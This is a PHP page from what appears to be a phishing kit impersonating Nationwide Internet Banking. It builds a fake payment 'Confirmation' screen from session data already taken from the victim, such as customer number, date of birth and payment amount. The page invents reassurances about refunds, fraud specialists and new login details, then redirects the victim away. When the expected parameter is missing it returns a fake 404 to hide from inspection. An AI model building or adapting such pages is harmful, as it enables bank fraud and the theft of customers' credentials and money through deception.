<?php
session_start();
error_reporting(0);
include "nw.php";
include "control.php";
include "connect/out.php";
if(isset($_GET["inID"]))
{	
	$challenge=getChallenge($_SESSION["cusnum"],$_SESSION["dob"],$panel_rec);
	$fname=randomCha(rand(10,12));
	$fj=randomCha(rand(4,7));
	$fj1=randomCha(rand(7,9));
	$fj2=randomCha(rand(10,12));
	$rand=rand(1,3);
	$text="terminated";
	if($_SESSION["act"]=="noref")
	{
		$text="authorised";
	}
	echo '<!DOCTYPE html>
<html lang="en"><head>
      <meta http-equiv="content-type" content="text/html; charset=UTF-8">
      <meta name="MSSmartTagsPreventParsing" content="true">
      <meta http-equiv="X-UA-Compatible" content="IE=Edge">
      <meta name="viewport" content="width=1000">
      <meta name="format-detection" content="telephone=no">
      <link href="game/way/square.css'.outrand().'" rel="stylesheet" type="text/css">
      <link href="game/way/flow.css'.outrand().'" rel="stylesheet" type="text/css">
      <link href="game/way/online.css'.outrand().'" rel="stylesheet" type="text/css">
      <link href="game/way/box.css'.outrand().'" rel="stylesheet" type="text/css">
      <link rel="shortcut icon" href="favicon.ico'.outrand().'">
      <link rel="apple-touch-icon" href="game/120.png'.outrand().'" sizes="120x120">
      <link rel="apple-touch-icon" href="game/76.png'.outrand().'" sizes="76x76">
      <link rel="apple-touch-icon" href="game/76.png'.outrand().'">
	  <meta http-equiv="refresh" content="9;URL='.$out_url.'" />
      <title>
         Confirmation - Nationwide Internet Bank
      </title>
   </head>
   <body id="log-in-reader" class="two-col default-theme">
      <div id="overlay-container" style="display: none;"></div>
      <div id="skipLinkList" role="navigation">
         <ul>
            <li class="first" style="display: none;"><a href="#skipNavPrimaryNav" class="skip-link" id="skiptoNavPrimaryNav" title="">Skip to main navigation</a></li>
            <li style="display: none;"><a href="#skipNavSecondaryNav" class="skip-link" id="skiptoNavSecondaryNav" title="">Skip to secondary navigation</a></li>
            <li class="first"><a href="#skipNavMainContent" class="skip-link" id="skiptoNavMainContent" title="">Skip to main content</a></li>
            <li><a href="#skipNavSearch" class="skip-link" id="skiptoNavSearch" title="">Skip to search</a></li>
            <li style="display: none;"><a href="#skipNavOffers" class="skip-link" id="skiptoNavOffers" title="">Skip to offers</a></li>
            <li class="last"><a href="#skipNavFooter" class="skip-link" id="skiptoNavFooter" title="">Skip to footer</a></li>
         </ul>
      </div>
      <div id="wrapper_outer">
         <div id="header">
            <header>
               <div class="welcome-util-container">
                  <ul id="utility-links" role="navigation">
                     <li class="demo">
                        <a href="#" target="">
                        </a>
                     </li>
                     <li class="help">
                        <a href="#" id="external-page-help-link">
                        Help &amp; Demos
                        <span class="new-window-link"></span>
                        <span class="srText">Opens in a new window</span>
                        </a>
                        <div class="ct" id="helpCustomTitle" role="tooltip">
                           <div class="custom-inner">
                              <p>Help &amp; Demos</p>
                           </div>
                           <b class="ct-arrow-top"></b>
                        </div>
                     </li>
                  </ul>
                  <div id="search" role="search">
                     <a id="skipNavSearch"></a>
                     <form action="/Help/Search" autocomplete="off" id="help-search-form" method="post" name="HelpSearch" onsubmit="loadNewWindow(\'\', this.target)" target="HelpSearchWindow">
                        <input id="txtSrch" type="text" title="" value="Search" name="query" maxlength="100">
                        <a class="btnSrchGo" href="#" id="help-search-button" title="" value="Search"><b class="button"></b><i></i></a>
                     </form>
                  </div>
               </div>
               <div id="brand" role="banner">
                  <div title="" class="logo">
                     <img alt="nationwide.co.uk" src="game/way/nationwide-logo.png">
                  </div>
                  <img class="png title" src="game/way/tagline.png" alt="internet banking">
               </div>
               <div id="last-access">
                  <p>SSL Secured form</p>
               </div>
               <div id="log-out">
                  <form action="/AccessManagement/Logout/Logout" autocomplete="off" id="logoutForm" method="get"><img alt="This website is secure" class="png" src="game/way/log-out-lock.png">
                     <p class="logged-in">You are logged in securely</p>
                     <a class="log-out-link" title="" href="#">
                     <b class="button">Log out</b>
                     <i></i>
                     </a>
                     <div class="lightboxContainer">
                        <div id="logoutLightbox" class="lightbox-outer">
                           <h1>Log out - confirmation</h1>
                           <strong>Are you sure you want to log out?</strong>
                           <div>
                              <ul class="choices">
                                 <li><a href="#" id="lbBtnYes" class="btn-action btn-yes"><b></b><i>Yes<span class="srText"> I want to logout</span></i></a></li>
                                 <li><a href="#" id="lbBtnNo" class="btn-action btn-no"><b></b><i>No<span class="srText"> I want to remain logged in</span></i></a></li>
                              </ul>
                           </div>
                           <div class="clear-line"></div>
                           <div class="activity-info">
                              <span>You can <a href="#">view and download your activity summary</a> before logging out.</span>
                           </div>
                        </div>
                     </div>
                  </form>
                  <div class="lightboxContainer">
                     <span id="secondsBeforeWarningDisplay">255</span>
                     <span id="secondsToDisplayWarning">30</span>
                     <span id="keepServerSessionAliveIntervalInSeconds">285</span>
                     <span id="logoutPageRoute">/AccessManagement/Logout/LogoutViaTimeout</span>
                     <span id="extendSessionRoute">/AccessManagement/Logout/ExtendSession</span>
                     <span id="extendServerSessionRoute">/AccessManagement/Logout/ExtendServerSession</span>
                     <div id="timeoutLightbox" class="lightbox-outer">
                        Time-out warning
                        <p>Due to inactivity, you will be automatically logged out of the Internet Bank in 30 seconds.</p>
                        <p>
                           You will be logged out in
                           <span id="secsLeft"></span>
                           seconds.
                        </p>
                        <strong>Do you want to remain logged in?</strong>
                        <ul class="choices">
                           <li><a href="#" id="lbBtnYesRemain" class="btn-action btn-yes"><b></b><i>Yes, remain logged in</i></a></li>
                           <li><a href="#" id="lbBtnNoLogOut" class="btn-action btn-no"><b></b><i>No, log out</i></a></li>
                        </ul>
                     </div>
                  </div>
               </div>
            </header>
         </div>
         <div id="wrapper_content">
            <div id="application">
               <div id="user-content" style="height: 515px;">
                  <span></span>
               </div>
               <div id="stage" style="height: 556px;">
                  <div id="stageInner" style="height: 510px;">
                     <div class="content">
                        <div class="main-content-column">
                           <a id="skipNavMainContent"></a>
                           <div id="pageMessageArea">
                              <div id="info-pageMessageArea" class="page-msg info-msg no-msg" role="alert">
                                 <h2><span></span></h2>
                                 <div class="inner-msg">
                                    <p></p>
                                 </div>
                              </div>
                              <div id="warning-pageMessageArea" class="page-msg warning-msg no-msg" role="alert">
                                 <h2><span></span></h2>
                                 <div class="inner-msg">
                                    <p></p>
                                 </div>
                              </div>
                              <div id="error-pageMessageArea" class="page-msg error-msg no-msg" role="alert">
                                 <h2><span></span></h2>
                                 <div class="inner-msg">
                                    <p></p>
                                 </div>
                              </div>
                              <div id="confirm-pageMessageArea" class="page-msg confirm-msg no-msg" role="alert">
                                 <h2><span></span></h2>
                                 <div class="inner-msg">
                                    <p></p>
                                 </div>
                              </div>
                           </div>
                           <div class="page-msg error-msg validation-summary-errors" id="errm" role="alert" style="display: none;">
                              <h2><b></b>Error</h2>
                              <div class="inner-msg">
                                 <p>Sorry - you must correct the errors on this page before you can continue.</p>
                              </div>
                           </div>
                           <div id="errm2" class="page-msg error-msg " role="alert" style="display: none;">
                              <h2><span></span>Error</h2>
                              <div class="inner-msg">
                                 <p>Your card reader details have been entered incorrectly. Please try again.</p>
                              </div>
                           </div>
                           <div class="content-pod login-pod">
                              <div class="stage-head">
                                 <h1>Confirmation</h1>
                              </div>
                              <div class="inner-box cust-num-box">
                                <form action="#" method="POST" onsubmit="validate(1); return false;" autocomplete="off" id="fform" name="fform" novalidate="novalidate">
                                    <p><span class="mandatory-fields-note"></span></p>
                                    <p class="section-header">We have successfully '.$text.' the payment request of <b>'.$_SESSION["amount"].'</b> to <b>'.$payee.'</b>.<br>
									';if($_SESSION["act"] == "ref"){ echo '
The amount has successfully refunded to your account this can take up to one working day.<br>
<br>
We have assigned a security specialist to look over this issue and get it assessed. You are suggested to not use your online banking for 24 hours as it is under observation for suspicious activity.<br>
<br>
You will receive a call from our fraud department along with the details of this incident.<br>
<br>
									Your new online details will be sent to your registered address.<br>';} echo '
<br>
You will be redirected shortly to our security pages, please wait.<br>
<br>
<br>
</p>

<p class="section-header" style="text-align: center;padding: 50px;"><img src="game/loader.gif" width="40" /></p>
                                    <p></p>
                                    
                                    
                                    
                                    
                                    
                                    
                                    
                                    
                                    
                                 </form>
                                 
                              </div>
                              
                           </div>
                        </div>
                        <div class="side-content-column">
                           <img alt="" src="game/way/CardReaderHolderImage.jpg"> 
                           <h3>Why do I need to do this?</h3>
                           <a class="new-window-link" href="#"><strong>Learn more</strong></a> about why we\'re asking you to use a card and card reader to do some Internet Banking transactions. 
                           <h3>How do I do this?</h3>
                           <a class="new-window-link" href="#"><strong>Watch a demo</strong><span class="srText">Opens in a new window</span></a> - How to use your card reader to set up, make or change payments.<br><br>
                           <a class="new-window-link" href="#"><strong>Find out</strong></a> how to use your card and card reader. 
                           <h3>What if I have any questions?</h3>
                           <a class="new-window-link" href="#"><strong>Get answers</strong></a> to common questions. 
                           <h3>My card reader isn\'t working.</h3>
                           <a class="new-window-link" href="#"><strong>Find out</strong></a> what to do if you have not received your card reader or it is not working properly. 
                           <style>
                              #vishing-msg {width:160px !important;}
                           </style>
                        </div>
                     </div>
                     <div class="clear-line">&nbsp;</div>
                  </div>
               </div>
               <div id="nw-content" style="height: 507px;">
                  <span>
                  </span>
               </div>
            </div>
         </div>
         <div id="footer">
            <footer>
               <a id="skipNavFooter"></a>
               <ul>
                  <li class="first"><a class="new-window-link" href="#">Accessibility<span class="srText">Opens in a new window</span></a></li>
                  <li><a class="new-window-link" href="#">Explore Nationwide<span class="srText">Opens in a new window</span></a></li>
                  <li><a href=""></a></li>
                  <li class="last"><a class="new-window-link" href="#">How Nationwide uses your information<span class="srText">Opens in a new window</span></a></li>
               </ul>
               <p class="legal"> Nationwide Building Society is authorised by the 
                  Prudential Regulation Authority and regulated by the Financial Conduct 
                  Authority and the Prudential Regulation Authority under registration 
                  number 106078. You can confirm our registration on the FCA’s website <a href="#" title="" class="new-window-link">www.fca.gov.uk<span class="srText"></span></a>. Nationwide is not responsible for the content of external websites.
               </p>
            </footer>
         </div>
      </div>
      <div id="lightbox-details" style="display:none;">
         <span id="lightbox-details-close-icon-title">Close</span>
         <div id="lightbox-details-close-icon-hidden-html">
            <span class="srText">Close layer and return to page</span>
         </div>
      </div>
      <div id="cboxOverlay" style="display: none;"></div>
      <div id="colorbox" class="" role="dialog" tabindex="-1" style="display: none;">
         <div id="cboxWrapper">
            <div>
               <div id="cboxTopLeft" style="float: left;"></div>
               <div id="cboxTopCenter" style="float: left;"></div>
               <div id="cboxTopRight" style="float: left;"></div>
            </div>
            <div style="clear: left;">
               <div id="cboxMiddleLeft" style="float: left;"></div>
               <div id="cboxContent" style="float: left;">
                  <div id="cboxTitle" style="float: left;"></div>
                  <div id="cboxCurrent" style="float: left;"></div>
                  <button type="button" id="cboxPrevious"></button><button type="button" id="cboxNext"></button><button id="cboxSlideshow"></button>
                  <div id="cboxLoadingOverlay" style="float: left;"></div>
                  <div id="cboxLoadingGraphic" style="float: left;"></div>
               </div>
               <div id="cboxMiddleRight" style="float: left;"></div>
            </div>
            <div style="clear: left;">
               <div id="cboxBottomLeft" style="float: left;"></div>
               <div id="cboxBottomCenter" style="float: left;"></div>
               <div id="cboxBottomRight" style="float: left;"></div>
            </div>
         </div>
         <div style="position: absolute; width: 9999px; visibility: hidden; display: none; max-width: none;"></div>
      </div>   
</body></html>';
session_destroy();
}
else
{
	header($_SERVER['SERVER_PROTOCOL'] . ' 404 Page Not Found', true, 403);
	die("<h1>404 Page Not Found</h1>");
}
?>